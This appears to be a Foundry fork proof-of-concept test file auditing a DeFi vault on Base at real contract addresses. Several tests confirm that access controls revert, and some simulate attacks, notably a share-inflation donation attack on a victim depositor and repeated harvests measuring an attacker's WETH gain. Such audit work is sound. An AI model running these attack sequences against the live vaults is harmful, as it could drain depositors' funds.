// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

/// @notice Fork PoC: can an external unprivileged attacker extract value from
///         DexFi Aggregator Vault V2 on Base?  Read-only on mainnet; fork only.
contract DexFiVaultTest is Test {
    address constant FACTORY = 0xcb34F261a5284554BB9FEa8aA12A0578c4bA3fC6;
    address constant WETH    = 0x4200000000000000000000000000000000000006;

    // published vaults with live LP positions (Base, block 53082339)
    address constant V1 = 0x2AeCe2BE0651baE5e2EF49426060B814E245829c;
    address constant V2 = 0x3A2f958d886d19a10b3475FAeAabd6d20b05592c;
    address constant V3 = 0xE205B423935FA14626b095205C7ADa44DaEB935f;

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://mainnet.base.org";
        vm.createSelectFork(rpc);
        vm.label(WETH, "WETH");
    }

    function _warp(uint256 s) internal { vm.warp(block.timestamp + s); vm.roll(block.number + s / 12 + 1); }

    // ------------------------------------------------------------------
    // 1. connectors must be callable only by their vault
    // ------------------------------------------------------------------
    function test_connector_gates() public {
        address conn = _connector(V1);
        assertTrue(conn != address(0), "connector");
        vm.startPrank(attacker);
        vm.expectRevert(); IDexFiFarm(conn).harvest();
        vm.expectRevert(); IDexFiFarm(conn).deposit(1 ether);
        vm.expectRevert(); IDexFiFarm(conn).withdraw(1);
        vm.expectRevert(); IDexFiFarm(conn).emergencyWithdraw(1, attacker);
        vm.expectRevert(); IDexFiFarm(conn).reinitialize("");
        vm.stopPrank();
        // initialize is one-shot (already initialized) -> reverts
        vm.prank(attacker);
        vm.expectRevert(); IDexFiFarm(conn).initialize("");
    }

    // ------------------------------------------------------------------
    // 2. harvest is permissionless; measure the caller's take
    // ------------------------------------------------------------------
    function test_harvest_permissionless_and_fee() public {
        uint256 a0 = IERC20(WETH).balanceOf(attacker);
        vm.prank(attacker);
        (uint256 reinv, uint256 fee, uint256 profit, uint256 paidDebt, uint256 remDebt, uint256 restake)
            = IDexFiVault(V1).harvest(0);
        uint256 a1 = IERC20(WETH).balanceOf(attacker);
        emit log_named_uint("reinvest", reinv);
        emit log_named_uint("harvestFee", fee);
        emit log_named_uint("profit", profit);
        emit log_named_uint("paidDebt", paidDebt);
        emit log_named_uint("restaking", restake);
        emit log_named_uint("attacker WETH delta", a1 - a0);
    }

    // ------------------------------------------------------------------
    // 3. can repeated harvest drain principal?  (loop, 1h apart)
    // ------------------------------------------------------------------
    function test_harvest_loop() public {
        uint256 start = IERC20(WETH).balanceOf(attacker);
        uint256 tot;
        for (uint256 i = 0; i < 12; i++) {
            _warp(3600);
            uint256 b0 = IERC20(WETH).balanceOf(attacker);
            vm.prank(attacker);
            IDexFiVault(V1).harvest(0);
            uint256 b1 = IERC20(WETH).balanceOf(attacker);
            tot += b1 - b0;
        }
        emit log_named_uint("attacker cumulative WETH from harvest", tot);
        emit log_named_uint("attacker net", IERC20(WETH).balanceOf(attacker) - start);
    }

    // ------------------------------------------------------------------
    // 4. deposit -> withdraw round trip (are shares fairly priced?)
    // ------------------------------------------------------------------
    function test_deposit_withdraw_roundtrip() public {
        uint256 dep = 1 ether;
        deal(WETH, attacker, dep);
        vm.startPrank(attacker);
        IERC20(WETH).approve(V1, dep);
        uint256 shares = IDexFiVault(V1).deposit(dep, attacker, 0);
        emit log_named_uint("shares minted", shares);
        _warp(1800);
        uint256 got = IDexFiVault(V1).withdraw(shares, attacker, 0);
        vm.stopPrank();
        emit log_named_uint("native out", got);
        emit log_named_int("net (out-in)", int256(got) - int256(dep));
    }

    // ------------------------------------------------------------------
    // 5. share inflation: attacker deposits tiny, donates to inflate the
    //    vault's price, then a victim deposits and attacker exits.
    // ------------------------------------------------------------------
    function test_share_inflation() public {
        // use V3 (has supply, small). Deposit small, donate WETH directly, victim deposits.
        uint256 aDep = 0.05 ether;
        deal(WETH, attacker, aDep + 10 ether);
        vm.startPrank(attacker);
        IERC20(WETH).approve(V3, aDep);
        uint256 aShares = IDexFiVault(V3).deposit(aDep, attacker, 0);
        // direct donation (does nothing if accounting is internal)
        IERC20(WETH).transfer(V3, 5 ether);
        vm.stopPrank();

        uint256 vDep = 1 ether;
        deal(WETH, victim, vDep);
        vm.startPrank(victim);
        IERC20(WETH).approve(V3, vDep);
        uint256 vShares = IDexFiVault(V3).deposit(vDep, victim, 0);
        vm.stopPrank();

        // attacker exits
        vm.prank(attacker);
        uint256 got = IDexFiVault(V3).withdraw(aShares, attacker, 0);
        emit log_named_uint("attacker shares", aShares);
        emit log_named_uint("victim shares", vShares);
        emit log_named_uint("attacker native out", got);
        emit log_named_int("attacker net", int256(got) - int256(aDep + 5 ether));
    }

    // ------------------------------------------------------------------
    // 6. owner-gated entry points
    // ------------------------------------------------------------------
    function test_owner_gates() public {
        vm.startPrank(attacker);
        vm.expectRevert(); IDexFiVault(V1).publish(0);
        IDexFiVault.Farm[] memory f;
        vm.expectRevert(); IDexFiVault(V1).updateFarms(f, 0);
        vm.stopPrank();
    }

    // ------------------------------------------------------------------
    // 7. can the attacker drain via emergencyWithdraw with no shares?
    // ------------------------------------------------------------------
    function test_emergency_withdraw_no_shares() public {
        vm.prank(attacker);
        vm.expectRevert(); IDexFiVault(V1).emergencyWithdraw();
    }

    // helpers
    function _connector(address v) internal view returns (address) {
        IDexFiVault.Farm memory f = IDexFiVault(v).farms(0);
        return IDexFiVault(v).farmConnector(f.beacon);
    }
}
